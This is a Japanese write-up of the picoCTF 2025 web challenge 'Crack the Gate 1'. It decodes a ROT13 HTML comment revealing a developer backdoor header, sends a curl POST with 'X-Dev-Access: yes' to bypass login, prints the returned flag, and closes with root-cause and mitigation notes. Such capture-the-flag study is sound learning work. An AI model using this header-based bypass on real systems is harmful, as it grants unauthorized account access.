# picoCTF 2025 – Crack the Gate 1

## Category
Web Exploitation

---

## 📝 Problem Overview

調査対象のWebポータルにログインし、隠された機密データ（flag）を取得する問題。

### 既知の情報

- ログインメールアドレス：`ctf-player@picoctf.org`
- パスワードは不明
- 通常のログインは失敗する
- 開発者が秘密の侵入経路を残している可能性がある

---

## 🔍 Initial Analysis

ログインページのHTMLソースを確認したところ、以下のコメントを発見した。

```html
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
```

`ABGR` という文字列が含まれている点に着目した。

---

## 🧠 Hypothesis

「ABGR」は ROT13 を示唆している可能性があると考えた。

### ROT13とは

アルファベットを13文字ずらす単純な換字暗号。

例：

- A ↔ N  
- B ↔ O  
- C ↔ P  

実際に変換すると：

```
ABGR → NOTE
```

つまり、このコメントは隠されたNOTE（開発者メモ）である可能性が高い。

---

## 🔐 Decoding

コメント内の文字列にROT13を適用した。

```
Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"
```

↓

```
Jack - temporary bypass: use header "X-Dev-Access: yes"
```

### 意味

開発者用の一時的な認証バイパスが存在し、  
HTTPヘッダ `X-Dev-Access: yes` を付与すればログインを回避できる。

---

## 🛠 Exploitation

ブラウザでは任意のHTTPヘッダを自由に追加できないため、`curl` を使用してPOSTリクエストを送信した。

```bash
curl -i -X POST "http://amiable-citadel.picoctf.net:51634/login" \
-H "X-Dev-Access: yes" \
-H "Content-Type: application/json" \
--data '{"email":"ctf-player@picoctf.org","password":"anything"}'
```

---

## 📬 Server Response

```json
{
  "success": true,
  "email": "ctf-player@picoctf.org",
  "firstName": "pico",
  "lastName": "player",
  "flag": "picoCTF{brut4_f0rc4_83812a02}"
}
```

---

## 🏁 Flag

```
picoCTF{brut4_f0rc4_83812a02}
```

---

## 🧩 Root Cause Analysis

本質的な問題点は、

> サーバー側がクライアントのHTTPヘッダを信頼して認証処理をスキップしていたこと。

### 問題点

- クライアントは任意のHTTPヘッダを送信可能
- 開発用バックドアが本番環境に残っている
- 認証ロジックがサーバー側で厳密に検証されていない

---

## 🛡 Mitigation

実務での対策：

- 開発用コードを本番環境に残さない
- クライアント入力（ヘッダ含む）を認証の根拠に使用しない
- 環境変数で開発／本番を明確に分離する
- 認証は必ずサーバー側で厳密に検証する

---

## 📚 What I Learned

- HTMLコメントも重要な調査対象である
- ROT13のような単純な暗号パターンを疑う視点が重要
- HTTPヘッダ改ざんによる認証バイパスは実務でも発生し得る
- curlを用いたカスタムHTTPリクエストの重要性
- 「クライアントは信用しない」という設計思想の重要性
